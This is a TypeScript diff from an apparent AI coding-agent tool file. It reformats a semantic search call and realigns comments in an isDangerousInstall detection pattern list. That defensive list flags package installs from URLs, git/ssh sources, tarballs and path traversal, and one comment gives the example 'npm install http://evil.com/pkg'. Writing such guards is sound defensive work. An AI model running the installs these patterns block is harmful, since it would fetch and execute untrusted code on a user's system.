@@ -443,7 +443,12 @@ const semanticSearchTool: AgentTool = {
   async execute(context, raw) {
     const args = raw as { query: string; limit?: number };
     // Pass any open context files so active-file boosting applies to on-demand searches too.
-    const results = await context.indexer.search(context.projectId, args.query, args.limit ?? 8, context.reads ? [...context.reads.keys()].map((key) => key.split(':')[0] ?? '').filter(Boolean) : []);
+    const results = await context.indexer.search(
+      context.projectId,
+      args.query,
+      args.limit ?? 8,
+      context.reads ? [...context.reads.keys()].map((key) => key.split(':')[0] ?? '').filter(Boolean) : [],
+    );
     if (results.length === 0) {
       return 'No semantic index results. The project may not be indexed yet; use search_code or read_file.';
     }
@@ -700,13 +705,13 @@ const runTestsTool: AgentTool = {
  */
 function isDangerousInstall(command: string): boolean {
   const patterns = [
-    /https?:\/\//i,           // npm install http://evil.com/pkg
-    /file:\.\./i,             // file:../../something
-    /\bgit\+https?:/i,        // git+https://
-    /\bgit\+ssh:/i,           // git+ssh://
+    /https?:\/\//i, // npm install http://evil.com/pkg
+    /file:\.\./i, // file:../../something
+    /\bgit\+https?:/i, // git+https://
+    /\bgit\+ssh:/i, // git+ssh://
     /\bssh:/i,
-    /(^|\s)\.\.[\\/]/,        // relative path traversal
-    /\btar\b.*\.tgz/i,        // tarball installs
+    /(^|\s)\.\.[\\/]/, // relative path traversal
+    /\btar\b.*\.tgz/i, // tarball installs
     /@[^/]+\/[^@\s]+@https?:\/\//i, // scoped pkg with URL version
   ];
   return patterns.some((pattern) => pattern.test(command));
